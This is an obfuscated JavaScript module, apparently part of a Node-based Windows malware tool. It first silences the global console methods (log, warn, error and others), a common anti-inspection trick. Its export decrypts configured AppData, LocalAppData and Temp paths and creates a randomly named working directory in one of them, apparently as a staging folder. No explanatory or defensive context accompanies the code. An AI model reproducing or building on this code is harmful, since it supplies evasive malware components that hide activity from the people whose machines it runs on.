const _0x1d9cff = (function () {
    let _0x3250db = true
    return function (_0x44c19b, _0x5c2717) {
      const _0x200500 = _0x3250db
        ? function () {
            if (_0x5c2717) {
              const _0x89f55a = _0x5c2717.apply(_0x44c19b, arguments)
              return (_0x5c2717 = null), _0x89f55a
            }
          }
        : function () {}
      _0x3250db = false
      return _0x200500
    }
  })(),
  _0x292cfd = _0x1d9cff(this, function () {
    const _0x1de23d = function () {
      let _0xf31744
      try {
        _0xf31744 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x50c2e7) {
        _0xf31744 = window
      }
      return _0xf31744
    }
    const _0x22e310 = _0x1de23d()
    const _0x1b5a17 = (_0x22e310.console = _0x22e310.console || {}),
      _0x29dc7d = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x4e0587 = 0; _0x4e0587 < _0x29dc7d.length; _0x4e0587++) {
      const _0x1842f0 = _0x1d9cff.constructor.prototype.bind(_0x1d9cff),
        _0x2e1d9e = _0x29dc7d[_0x4e0587],
        _0x4b3273 = _0x1b5a17[_0x2e1d9e] || _0x1842f0
      _0x1842f0['__proto__'] = _0x1d9cff.bind(_0x1d9cff)
      _0x1842f0.toString = _0x4b3273.toString.bind(_0x4b3273)
      _0x1b5a17[_0x2e1d9e] = _0x1842f0
    }
  })
_0x292cfd()
module.exports = (_0x4429b1) => {
  return {
    path: undefined,
    generate_path: () => {
      const _0xc6b77d = [
        _0x4429b1.utils.encryption.decryptData(
          _0x4429b1.config.user.localappdata
        ),
        _0x4429b1.utils.encryption.decryptData(_0x4429b1.config.user.appdata),
        _0x4429b1.utils.encryption.decryptData(_0x4429b1.config.user.temp),
      ]
      const _0x1b8fb2 = _0xc6b77d[Math.floor(Math.random() * _0xc6b77d.length)]
      const _0x3135f1 = _0x4429b1.requires.crypto.randomUUID()
      return (
        _0x4429b1.requires.fs.mkdirSync(_0x1b8fb2 + '\\' + _0x3135f1, 484),
        _0x1b8fb2 + '\\' + _0x3135f1
      )
    },
  }
}
